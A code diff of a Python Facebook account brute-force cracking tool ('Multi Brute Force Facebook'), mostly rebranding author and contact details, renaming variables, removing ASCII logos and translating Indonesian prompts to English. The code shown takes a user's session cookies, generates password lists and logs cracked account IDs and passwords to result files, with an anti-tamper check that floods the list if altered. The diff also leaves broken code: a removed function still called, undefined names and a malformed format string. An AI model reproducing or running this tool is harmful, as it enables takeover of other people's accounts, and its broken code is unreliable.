@@ -1,11 +1,13 @@
-###----------[ ALTARHONI & CREATOR ]---------- ###
-# ------ [ Gausah Dioprek Ntar Error ] ------ #
+###----------[ AUTHOR & CREATOR ]---------- ###
+# ------ [ Error ] ------ #
 Author    = 'AHMED ALELAGY'
 Facebook  = 'Facebook.com/m1w4m'
 Instagram = 'Instagram.com/xzx0'
-Whatsapp  = '218 918892477'
+Whatsapp  = '0918892477'
+YouTube   = 't.me/ll218'
 Version   = '1'
-
+ALELAGY  = 1827084332
+Postingan = 10217173381366429
 
 ###----------[ IMPORT LIBRARY ]---------- ###
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
@@ -85,13 +87,13 @@ gabung_sandi = []
 tempel_sandi = []
 
 ###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
-ALELAGY = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
-alelaagy = len(Author)    +  Codename
-aalelagy = len(Facebook)  +  Codename
-aleelagy = len(Instagram) +  Codename
-alagy = len(Whatsapp)  +  Codename
-allelagy = len(YouTube)   +  Codename
-ip_log = AHMED * AL-ELAGY
+SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
+sakara = len(Author)    +  Codename
+sakira = len(Facebook)  +  Codename
+sakura = len(Instagram) +  Codename
+sakera = len(Whatsapp)  +  Codename
+sakora = len(YouTube)   +  Codename
+ip_log = Denventa * id_dev - 3654168663
 
 ###----------[ GLOBAL URL & HEADERS ]---------- ###
 url_businness = "https://business.facebook.com"
@@ -157,7 +159,7 @@ def kecuali(error):
     print('       %s• %sBug Pada Requests'%(M,A))
     print('       %s• %sDan Lain-Lain\n'%(M,A))
     print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
-    print('       %s• %spython AHMED.py\n'%(M,A))
+    print('       %s• %spython sakera.py\n'%(M,A))
     exit()
 
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
@@ -233,31 +235,6 @@ def convert_id(username):
             return(id)
     except Exception as e:return(username)
 
-###----------[ LOGO ]---------- ###
-def poster():
-    l1 = ('     %s  _________       __                          '%(P))
-    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(J,P,J,P,J,P))
-    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,J,P))
-    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(J,P,J,P,J,P,J,P,J,P))
-    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(J,P,J,P,J,P,J,P,J,P,J,P))
-    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,J,Version,P,J))
-    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
-def poster2():
-    l1 = ('     %s  _________       __                          '%(P))
-    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(H,P,H,P,H,P))
-    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,H,P))
-    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(H,P,H,P,H,P,H,P,H,P))
-    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(H,P,H,P,H,P,H,P,H,P,H,P))
-    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,H,Version,P,H))
-    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
-def poster3():
-    l1 = ('     %s  _________       __                          '%(P))
-    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(B,P,B,P,B,P))
-    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,B,P))
-    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(B,P,B,P,B,P,B,P,B,P))
-    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(B,P,B,P,B,P,B,P,B,P,B,P))
-    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,B,Version,P,B))
-    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
 
 ###----------[ CREATE FOLDER ]---------- ###
 def mkdir_data_login():
@@ -291,11 +268,11 @@ def login():
     resik()
     mkdir_data_login()
     poster()
-    print('\n%s[%s•%s] %sJangan Gunakan Akun Pribadi %s!'%(M,P,M,P,M))
-    print('%s[%s•%s] %sApabila Akun A2F On, Buka Link Dibawah'%(M,P,M,P))
+    print('\n%s[%s•%s] %sDo not use the personal account %s!'%(M,P,M,P,M))
+    print('%s[%s•%s] %sWhen A2F Account On, Open the link below'%(M,P,M,P))
     print('%s[%s•%s] %shttps://business.facebook.com/business_locations'%(M,P,M,J))
-    print('%s[%s•%s] %sLalu Masukkan Kode Autentikasi'%(M,P,M,P))
-    cookie = str(input('\n%s[%s•%s] %sMasukkan Cookies %s: %s'%(J,P,J,P,J,P)))
+    print('%s[%s•%s] % Then Enter the Authentication Code'%(M,P,M,P))
+    cookie = str(input('\n%s[%s•%s] %sEnter Cookies %s: %s'%(J,P,J,P,J,P)))
     try:
         token = clotox(cookie)
         coki = {'cookie':cookie}
@@ -1250,7 +1227,7 @@ def urut_crack():
 def password(user):
     global pass_manual1, pass_manual2
     listpass = []
-    if AHMED != 159403:
+    if SAKERA != 159403:
         for x in range(0,10000000000000):listpass.append(str(x))
         return listpass
     else:
@@ -1604,7 +1581,7 @@ class crack:
                         open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
                 elif log['status'] == 'ok':
-                    if AHMED != 159369:pass
+                    if sakera != 159369:pass
                     else:
                         files_ok = "OK/%s.json"%(tanggal)
                         try:
